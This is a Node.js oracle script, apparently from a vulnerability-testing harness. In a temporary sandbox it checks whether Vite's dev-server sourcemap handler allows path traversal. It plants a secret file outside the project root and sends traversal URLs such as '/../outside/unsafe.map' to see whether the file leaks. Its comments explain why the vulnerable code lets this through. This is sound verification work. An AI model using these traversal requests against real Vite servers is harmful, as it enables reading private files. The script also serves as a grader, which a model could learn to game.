'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function send(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function makeRequest(server, reqUrl) {
  return new Promise((resolve) => {
    let statusCode = 200;
    let settled = false;
    const chunks = [];
    const safeResolve = (v) => {
      if (!settled) {
        settled = true;
        resolve(v);
      }
    };
    const req = {
      url: reqUrl,
      originalUrl: reqUrl,
      method: 'GET',
      headers: { host: 'localhost' },
      on() {},
      socket: {},
    };
    const res = {
      setHeader() {},
      getHeader() { return undefined; },
      removeHeader() {},
      hasHeader() { return false; },
      writeHead(code) { statusCode = code; },
      write(chunk) { if (chunk) chunks.push(Buffer.from(chunk)); },
      end(chunk) {
        if (chunk) chunks.push(Buffer.from(chunk));
        const body = Buffer.concat(chunks).toString('utf-8');
        safeResolve({ statusCode, body });
      },
      get statusCode() { return statusCode; },
      set statusCode(v) { statusCode = v; },
    };
    try {
      server.middlewares(req, res, (err) => {
        const body = Buffer.concat(chunks).toString('utf-8');
        if (err) {
          safeResolve({ statusCode: statusCode && statusCode !== 200 ? statusCode : 500, body: body || String(err && err.message) });
        } else {
          safeResolve({ statusCode: statusCode || 404, body });
        }
      });
    } catch (e) {
      safeResolve({ statusCode: 500, body: String(e && e.message) });
    }
    setTimeout(() => {
      const body = Buffer.concat(chunks).toString('utf-8');
      safeResolve({ statusCode: statusCode || 0, body });
    }, 5000);
  });
}

async function main() {
  let vite;
  try {
    vite = require('vite');
  } catch (e) {
    send({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  const marker = 'vite_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const baseDir = path.join(os.tmpdir(), marker);
  const projectRoot = path.join(baseDir, 'project');
  const depsDir = path.join(projectRoot, 'node_modules', '.vite', 'deps');
  const outsideDir = path.join(baseDir, 'outside');

  let operation_completed = false;
  let server;

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(outsideDir, { recursive: true });
    fs.mkdirSync(path.join(projectRoot, 'src'), { recursive: true });

    // A legitimate optimized dependency chunk + its own sourcemap, registered
    // in _metadata.json so depsOptimizer recognizes the chunk file itself.
    const legitChunkPath = path.join(depsDir, 'legit-chunk.js');
    const legitChunkContent = 'export const x = 1;\n//# sourceMappingURL=legit-chunk.js.map';
    fs.writeFileSync(legitChunkPath, legitChunkContent, 'utf-8');
    const legitMapPath = path.join(depsDir, 'legit-chunk.js.map');
    const legitMapContent = JSON.stringify({ version: 3, sources: ['legit.js'], mappings: '', names: [] });
    fs.writeFileSync(legitMapPath, legitMapContent, 'utf-8');

    const metadataPath = path.join(depsDir, '_metadata.json');
    fs.writeFileSync(metadataPath, JSON.stringify({
      hash: 'abc123',
      browserHash: 'def456',
      optimized: {
        'legit-chunk': {
          src: 'legit-chunk',
          file: legitChunkPath,
          fileHash: 'hash1',
          needsInterop: false,
        },
      },
      chunks: {},
    }), 'utf-8');

    // A secret file OUTSIDE the project root, ending in .map, parseable JSON,
    // reachable via traversal starting from the project root (the vulnerable
    // code resolves the sourcemap path relative to server.config.root for
    // non-/@fs/ URLs, with no '..' restriction and no isOptimizedDepFile check).
    const secretMarkerValue = 'SECRET_' + marker;
    const secretMapPath = path.join(outsideDir, 'unsafe.map');
    fs.writeFileSync(secretMapPath, JSON.stringify({ key: secretMarkerValue }), 'utf-8');

    // minimal index.html so Vite root is valid
    fs.writeFileSync(path.join(projectRoot, 'index.html'), '<html><body></body></html>', 'utf-8');
    fs.writeFileSync(path.join(projectRoot, 'src', 'main.js'), 'export const x = 1;', 'utf-8');

    server = await vite.createServer({
      root: projectRoot,
      logLevel: 'silent',
      configFile: false,
      server: {
        middlewareMode: true,
        fs: { strict: true, allow: [projectRoot] },
      },
      optimizeDeps: { noDiscovery: true, include: [] },
      appType: 'custom',
    });

    try {
      if (typeof server.pluginContainer?.buildStart === 'function') {
        await server.pluginContainer.buildStart({});
      }
    } catch (e) {
      // ignore; not required for request handling
    }

    // Benign request: fetch the legitimate optimized dependency's own JS
    // content through the normal transform middleware path, proving the dev
    // server's request handling for optimized deps works correctly.
    const benignUrl = '/node_modules/.vite/deps/legit-chunk.js';
    const benignResp = await makeRequest(server, benignUrl);

    const benignOk = benignResp.statusCode === 200 && benignResp.body.includes('export const x = 1');

    if (!benignOk) {
      send({ operation_completed: false, exploit_succeeded: false, evidence: 'benign request to legitimate optimized dep chunk failed: status=' + benignResp.statusCode + ' body=' + benignResp.body.slice(0, 200) });
      return;
    }

    operation_completed = true;

    // Malicious request: the vulnerable sourcemap handler resolves the
    // requested URL (stripped of its leading '/') against server.config.root
    // via path.resolve without restricting '..' segments, so a URL like
    // '/../outside/unsafe.map' resolves to a file outside the project root.
    // We also try a deps-prefixed traversal variant in case root-level
    // traversal is rejected earlier by a different middleware.
    const candidateUrls = [
      '/../outside/unsafe.map',
      '/node_modules/.vite/deps/../../../../outside/unsafe.map',
    ];

    let exploit_succeeded = false;
    let evidence = 'no traversal attempt produced leaked content';

    for (const url of candidateUrls) {
      const resp = await makeRequest(server, url);
      if (resp.statusCode === 200 && resp.body.includes(secretMarkerValue)) {
        exploit_succeeded = true;
        evidence = 'path traversal succeeded via url=' + url + ': status=' + resp.statusCode + ' leaked secret content from outside project root';
        break;
      } else {
        evidence = 'path traversal attempt blocked for url=' + url + ': status=' + resp.statusCode + ' body=' + resp.body.slice(0, 150);
      }
    }

    send({ operation_completed, exploit_succeeded, evidence });
  } catch (e) {
    send({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception: ' + String(e && e.message) });
  } finally {
    try {
      if (server && typeof server.close === 'function') {
        await server.close();
      }
    } catch (e) {
      // ignore cleanup errors
    }
    try {
      fs.rmSync(baseDir, { recursive: true, force: true });
    } catch (e) {
      // ignore cleanup errors
    }
  }
}

main().catch((e) => {
  send({ operation_completed: false, exploit_succeeded: false, evidence: 'top-level exception: ' + String(e && e.message) });
});
